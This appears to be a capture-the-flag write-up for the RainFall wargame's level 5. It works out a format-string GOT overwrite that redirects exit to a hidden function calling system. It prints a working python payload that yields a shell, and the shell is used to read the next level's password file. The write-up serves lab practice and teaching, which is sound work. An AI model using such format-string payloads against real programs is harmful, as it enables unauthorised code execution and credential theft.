# LEVEL05

## Analysis

So we have the main and 2 functions, <n> and <o>. Since <o> is not called but use <system@plt> we'll need to trigger that function using the printf in <n> and use the GOT on exit to call <o>.
This technique is quite useful because Global Offset table addresses don't change.

## Solution 1: Format String GOT Overwrite

As we did earlier we'll first take a look at the offset and gather all the information we need for our script:
```bash
    level5@RainFall:~$ ./level5
    AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
    AAAA200.b7fd1ac0.b7ff37d0.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.a78.0.b7fe765d.b7e3ebaf
```
```bash
   level5@RainFall:~$ objdump -R ./level5 | grep exit
   08049828 R_386_JUMP_SLOT   _exit
   08049838 R_386_JUMP_SLOT   exit
```
So the target address is 0x080484a4 which is equal to 134513828 in decimal.

So far we have:
- Offset = 4;
- <o> address = 080484a4;
- <exit@plt> address = 08049838;
- input = 134513828 - 4 = 134513824;

```bash
   level5@RainFall:~$ (python -c 'print "\x08\x04\x98\x38"[::-1] + "%134513824c%4$n"'; cat) | ./level5
   [...]
   cat /home/user/level6/.pass
   XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
[...]
```
